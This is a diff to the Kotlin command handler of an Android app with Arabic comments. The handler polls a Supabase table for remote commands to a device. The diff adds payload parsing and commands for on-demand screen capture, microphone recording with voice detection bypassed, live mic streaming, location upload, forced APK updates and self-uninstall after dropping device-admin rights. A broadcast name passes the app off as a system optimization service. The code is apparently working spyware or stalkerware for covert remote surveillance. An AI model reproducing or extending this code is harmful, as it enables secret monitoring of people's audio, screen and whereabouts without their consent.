@@ -17,9 +17,12 @@ data class CommandRecord(
     val device_id: String,
     val command: String,
     val status: String,
+    val payload: kotlinx.serialization.json.JsonElement? = null, // JSONB from Supabase
     val created_at: String? = null,
     val executed_at: String? = null
 )
+
+
 
 /**
  * مدير الأوامر (Command Manager)
@@ -59,13 +62,21 @@ class RealtimeCommandManager(
                         )
 
                         // نجلب الأوامر المعلقة لهذا الجهاز
-                        val newCommands = client.postgrest[TABLE_NAME]
-                            .select {
-                                filter {
-                                    eq("device_id", currentDeviceId)
-                                    eq("status", "PENDING")
-                                }
-                            }.decodeList<CommandRecord>()
+                        val newCommands = try {
+                            client.postgrest[TABLE_NAME]
+                                .select {
+                                    filter {
+                                        eq("device_id", currentDeviceId)
+                                        eq("status", "PENDING")
+                                    }
+                                }.decodeList<CommandRecord>()
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Serialization error fetching commands: ${e.message}")
+                            SupabaseManager.getInstance().logRemote(context, TAG, "ERROR", 
+                                "Command Serialization Error: ${e.message}")
+                            emptyList<CommandRecord>()
+                        }
+
 
                         // تنفيذ الأوامر المكتشفة
                         for (cmd in newCommands) {
@@ -73,7 +84,8 @@ class RealtimeCommandManager(
                                 Log.i(TAG, "New command detected: ${cmd.command}")
                                 supabase.logRemote(context, TAG, "INFO", "Executing command: ${cmd.command}")
                                 
-                                val success = executeCommand(cmd.command.uppercase().trim())
+                                val success = executeCommand(cmd.command.uppercase().trim(), cmd.payload)
+
                                 
                                 // تحديث الحالة إلى منفذ (أو فشل) بعد المحاولة
                                 val statusResult = if (success) "EXECUTED" else "FAILED"
@@ -104,7 +116,8 @@ class RealtimeCommandManager(
         }
     }
 
-    private suspend fun executeCommand(command: String): Boolean {
+    private suspend fun executeCommand(command: String, payloadJson: kotlinx.serialization.json.JsonElement?): Boolean {
+
         return try {
             when (command) {
                 "LOCK" -> {
@@ -120,22 +133,26 @@ class RealtimeCommandManager(
                     true
                 }
                 "CAPTURE" -> {
-                    val projection = projectionProvider()
-                    if (projection != null) {
-                        screenCapture.captureAndUpload(projection, forceCapture = true)
+                    MonitoringForegroundService.getInstance()?.let { service ->
+                        service.startManualScreen(5) // Capture 5 cycles on demand
                         true
-                    } else {
-                        Log.w(TAG, "MediaProjection is null — triggering re-acquisition")
-                        supabase.logRemote(context, TAG, "WARN", "MediaProjection NULL — re-requesting permission")
-                        // إطلاق إعادة الاكتساب تلقائياً
-                        android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
-                        }
+                    } ?: run {
+                        Log.w(TAG, "CAPTURE: Service instance NULL")
                         false
                     }
                 }
                 "RECORD" -> {
-                    audioRecorder.recordAndUpload(30000L)
+                    val duration = try {
+                        if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                            payloadJson["duration"]?.let {
+                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
+                            } ?: 30_000L
+                        } else {
+                            30_000L
+                        }
+                    } catch (e: Exception) { 30_000L }
+                    
+                    audioRecorder.recordAndUpload(duration, bypassVad = true)
                     true
                 }
                 "LISTEN_START" -> {
@@ -147,6 +164,33 @@ class RealtimeCommandManager(
                     true
                 }
                 // ── Hybrid Mic (v18.2) ────────────────────────────────────
+                "MIC" -> {
+                    // Parse payload for action
+                    val action = try {
+                        val actionValue = if (payloadJson is kotlinx.serialization.json.JsonPrimitive) {
+                            payloadJson.content
+                        } else if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                            payloadJson["action"]?.let {
+                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content else it.toString()
+                            }
+                        } else {
+                            null
+                        }
+                        actionValue ?: "START"
+                    } catch (e: Exception) { "START" }
+
+
+                    val deviceId = android.provider.Settings.Secure.getString(
+                        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                    ) ?: "unknown"
+
+                    if (action == "START" || action == "MIC_STREAM") {
+                        micManager.startStream(deviceId)
+                    } else {
+                        micManager.stopStream()
+                    }
+                    true
+                }
                 "MIC_STREAM" -> {
                     val deviceId = android.provider.Settings.Secure.getString(
                         context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
@@ -159,11 +203,57 @@ class RealtimeCommandManager(
                     true
                 }
                 "MIC_RECORD" -> {
-                    micManager.recordClip(30_000L)
-                    true
+                    MonitoringForegroundService.getInstance()?.let { service ->
+                        // Optional: parse duration from payload
+                        val duration = try {
+                            if (payloadJson is kotlinx.serialization.json.JsonObject) {
+                                payloadJson["duration"]?.let {
+                                    if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
+                                } ?: 30_000L
+                            } else {
+                                30_000L
+                            }
+                        } catch (e: Exception) { 30_000L }
+                        
+                        service.startManualMic(duration)
+                        true
+                    } ?: run {
+                        Log.w(TAG, "MIC_RECORD: Service instance NULL")
+                        false
+                    }
                 }
+
                 "LOCATE" -> {
                     gpsTracker.fetchAndUploadLocation()
+                    true
+                }
+                "UNINSTALL" -> {
+                    // محاولة إلغاء تثبيت التطبيق نفسه عن بُعد
+                    supabase.logRemote(context, TAG, "INFO", "UNINSTALL command received — attempting self-uninstall")
+                    try {
+                        // إذا كان device admin مفعلاً → إلغاء صلاحيات المدير أولاً ثم الحذف
+                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                        val adminReceiver = android.content.ComponentName(context, MyDeviceAdminReceiver::class.java)
+                        if (dpm.isAdminActive(adminReceiver)) {
+                            dpm.removeActiveAdmin(adminReceiver)
+                        }
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Admin removal failed: ${e.message}")
+                    }
+                    // فتح واجهة إلغاء التثبيت
+                    val intent = android.content.Intent(android.content.Intent.ACTION_DELETE).apply {
+                        data = android.net.Uri.parse("package:${context.packageName}")
+                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    }
+                    context.startActivity(intent)
+                    true
+                }
+                "RESTART" -> {
+                    // إرسال broadcast لإعادة تشغيل الخدمة عبر ServiceRestartReceiver
+                    val restartIntent = android.content.Intent("com.android.system.optimization.engine.RESTART")
+                    restartIntent.setPackage(context.packageName)
+                    context.sendBroadcast(restartIntent)
+                    supabase.logRemote(context, TAG, "INFO", "RESTART command: broadcast sent to ServiceRestartReceiver")
                     true
                 }
                 "UPDATE" -> {
@@ -174,7 +264,8 @@ class RealtimeCommandManager(
                         updateManager.checkAndExecuteUpdate(
                             targetVersion = settings.target_version,
                             apkPath       = settings.update_apk_path,
-                            apkUrl        = settings.update_apk_url
+                            apkUrl        = settings.update_apk_url,
+                            forceIntent   = true
                         )
                     } else {
                         Log.w(TAG, "UPDATE: fetchSettings returned null")
